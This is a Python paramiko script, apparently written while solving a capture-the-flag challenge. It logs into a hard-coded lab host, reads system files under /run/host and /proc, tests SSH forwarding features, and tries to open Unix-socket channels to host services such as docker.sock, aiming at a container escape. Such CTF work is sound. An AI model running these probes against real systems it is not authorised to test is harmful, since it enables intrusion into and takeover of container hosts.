import paramiko
import socket
import time
import sys

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def read_host_files():
    """读取/run/host下的文件"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 读取/run/host文件...")
    
    files = [
        "/run/host/container-uuid",
        "/run/host/container-manager",
        "/run/host/os-release"
    ]
    
    for f in files:
        print(f"\n{f}:")
        session = transport.open_session()
        session.exec_command(f"cat {f}")
        print(session.recv(4096).decode())
    
    # 详细列出/run/host
    print("\n完整目录结构:")
    session = transport.open_session()
    session.exec_command("find /run/host")
    print(session.recv(4096).decode())
    
    ssh.close()

def explore_more_paths():
    """探索更多路径"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 检查/proc和/sys的更多信息
    print("[*] 检查/proc信息...")
    
    for path in [
        "/proc/version",
        "/proc/cmdline", 
        "/proc/cpuinfo",
        "/proc/meminfo",
        "/sys/class/net/"
    ]:
        session = transport.open_session()
        session.exec_command(f"cat {path}" if not path.endswith('/') else f"ls -la {path}")
        print(f"\n{path}:")
        print(session.recv(4096).decode()[:500])
    
    ssh.close()

def check_ssh_features():
    """
    检查SSH的各种特性
    
    SSH有很多特性，可能用到的包括：
    1. Agent forwarding
    2. X11 forwarding
    3. Port forwarding (local/remote)
    4. Channel multiplexing
    5. Subsystems
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试SSH特性...")
    
    # 测试X11转发
    print("\n测试X11转发...")
    try:
        channel = transport.open_session()
        channel.request_x11()
        print("X11转发请求成功")
    except Exception as e:
        print(f"X11转发失败: {e}")
    
    # 测试反向端口转发
    print("\n测试反向端口转发...")
    try:
        port = transport.request_port_forward('', 0)
        print(f"反向端口转发成功，端口: {port}")
        transport.cancel_port_forward('', port)
    except Exception as e:
        print(f"反向端口转发失败: {e}")
    
    # 测试exec-command子系统
    print("\n测试子系统...")
    subsystems = ["sftp", "netconf", "shell"]
    for sub in subsystems:
        try:
            channel = transport.open_session()
            channel.invoke_subsystem(sub)
            print(f"{sub}: 成功")
            channel.close()
        except Exception as e:
            print(f"{sub}: {e}")
    
    ssh.close()

def test_channel_types():
    """测试不同的通道类型"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试不同通道类型...")
    
    # direct-tcpip
    print("\n1. direct-tcpip:")
    try:
        channel = transport.open_channel("direct-tcpip", ("127.0.0.1", 22), ('127.0.0.1', 0))
        print("   成功")
        channel.close()
    except Exception as e:
        print(f"   失败: {e}")
    
    # forwarded-tcpip (这个是服务端发起的)
    
    # session
    print("\n2. session:")
    try:
        channel = transport.open_session()
        print("   成功")
        channel.close()
    except Exception as e:
        print(f"   失败: {e}")
    
    # x11
    print("\n3. x11:")
    try:
        channel = transport.open_x11_channel()
        print("   成功")
    except Exception as e:
        print(f"   失败: {e}")
    
    # auth-agent
    print("\n4. auth-agent@openssh.com:")
    try:
        channel = transport.open_channel("auth-agent@openssh.com")
        print("   成功")
    except Exception as e:
        print(f"   失败: {e}")
    
    ssh.close()

def test_streamlocal():
    """
    测试streamlocal（Unix socket转发）
    
    这是一个重要的特性！
    如果我们能转发Unix socket，可能可以访问宿主机的某些服务
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试streamlocal (Unix socket转发)...")
    
    # 尝试打开到宿主机docker socket的连接
    sockets = [
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/run/containerd/containerd.sock",
        "/run/systemd/private",
        "/run/dbus/system_bus_socket",
        "/run/host/notify"
    ]
    
    for sock_path in sockets:
        print(f"\n测试 {sock_path}:")
        try:
            # direct-streamlocal@openssh.com 用于连接远程Unix socket
            channel = transport.open_channel("direct-streamlocal@openssh.com", 
                                            (sock_path, ""), 
                                            ('127.0.0.1', 0))
            print("   连接成功!")
            
            # 尝试发送数据
            if "docker" in sock_path:
                channel.send(b"GET /version HTTP/1.0\r\n\r\n")
                time.sleep(0.5)
                if channel.recv_ready():
                    print(f"   响应: {channel.recv(1024)}")
            
            channel.close()
        except Exception as e:
            print(f"   失败: {e}")
    
    ssh.close()

def test_streamlocal_raw():
    """使用原始消息测试streamlocal"""
    
    import struct
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 测试原始streamlocal请求...")
    
    # SSH channel类型
    # 90 = SSH_MSG_CHANNEL_OPEN
    
    # 尝试直接发送channel open请求
    # 这需要更底层的操作
    
    # 检查transport支持的通道类型
    print(f"Transport支持的认证方法: {transport.auth_handler}")
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 详细SSH特性测试")
    print("="*60)
    
    print("\n[1] 读取host文件")
    read_host_files()
    
    print("\n[2] 探索更多路径")
    explore_more_paths()
    
    print("\n[3] 检查SSH特性")
    check_ssh_features()
    
    print("\n[4] 测试通道类型")
    test_channel_types()
    
    print("\n[5] 测试streamlocal")
    test_streamlocal()
